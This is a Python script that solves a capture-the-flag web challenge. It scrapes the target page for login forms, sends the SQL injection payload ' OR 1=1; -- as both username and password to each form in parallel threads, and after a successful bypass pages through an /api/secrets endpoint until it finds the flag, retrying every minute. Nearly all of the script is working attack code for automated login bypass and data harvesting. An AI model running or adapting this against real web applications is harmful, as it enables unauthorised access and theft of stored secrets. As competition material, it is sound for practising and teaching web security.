import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import re
import threading

pattern = r"EPT\{[A-Za-z0-9_-]+\}"

base_url = "https://blodbamsen-e5b2-allthoseforms.ept.gg"
login_page = "/"

# SQL Injection payload
sqli_payload = "' OR 1=1; --"
success_message = 'Welcome to Our App!'

# Flag to track if a vulnerable endpoint was found
vulnerable_found = threading.Event()

# Function to retrieve login endpoints from the main page
def fetch_login_endpoints():
    try:
        print("[*] Fetching login endpoints...")
        response = requests.get(base_url + login_page, timeout=5)
        soup = BeautifulSoup(response.text, "html.parser")
        
        # Find all form action URLs with "/login/"
        login_endpoints = [
            form["action"] for form in soup.find_all("form", action=True)
            if "/login/" in form["action"]
        ]
        print(f"[+] Found {len(login_endpoints)} login endpoints.")
        return login_endpoints
    except requests.RequestException as e:
        print(f"[!] Error fetching login endpoints: {e}")
        return []

#Function to perform the SQLi
def attempt_sqli(endpoint):
    global flag
    if vulnerable_found.is_set(): #Stop next thread if the flag is found
        return

    full_url = base_url + endpoint
    #print(f"Testing endpoint: {full_url}")
    
    data = {
        "username": sqli_payload,
        "password": sqli_payload
    }
    
    try:
        # Use a session to maintain cookies
        session = requests.Session()
        
        # Send the POST request
        response = session.post(full_url, data=data, timeout=5)
        response_text = response.text
        
        if success_message in response_text:
            print(f"[+] Potentially vulnerable endpoint found at: {full_url}")   

            #This prints out the /api-docs
            """
            api_docs_url = f"{base_url}/api-docs"
            api_docs_response = session.get(api_docs_url)
            print("\nAPI Docs Response:")
            print(api_docs_response.text)"""     
            
            # Use the session to make a request to `/api/secrets`
            for i in range(80,126): #The flag was located on page 84. It did take some manual editing in the range to get to this.
                api_response = session.get(f"{base_url}/api/secrets?page={i}&page_size=20")
                if api_response.status_code == 200:
                    print("API Secrets Response:\n", api_response.json())
                    secrets_data = api_response.json().get('secrets', [])
                    for item in secrets_data:
                        text = item.get('text', '')
                        match = re.search(pattern, text)
                        if match:
                            vulnerable_found.set()
                            return match.group()
                else:
                    print("Failed to retrieve /api/secrets data")

            vulnerable_found.set()  # Stop the testing
        else:
            pass 
    except requests.RequestException as e:
        print(f"[!] Error testing {full_url}: {e}")
    
    return None

if __name__ == "__main__":
    flag = ''
    while True:
        vulnerable_found.clear()
        login_endpoints = fetch_login_endpoints()
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            future_to_endpoint = {executor.submit(attempt_sqli, endpoint): endpoint for endpoint in login_endpoints}
            
            for future in as_completed(future_to_endpoint):
                match = future.result()
                if match:
                    flag = match
                    break

        if vulnerable_found.is_set():
            print("[*] Found flag!")
            break

        print("[-] Lets go another round! ")
        time.sleep(60)
    if flag:
        print(F"\n\nThe flag is \n\n{flag}")
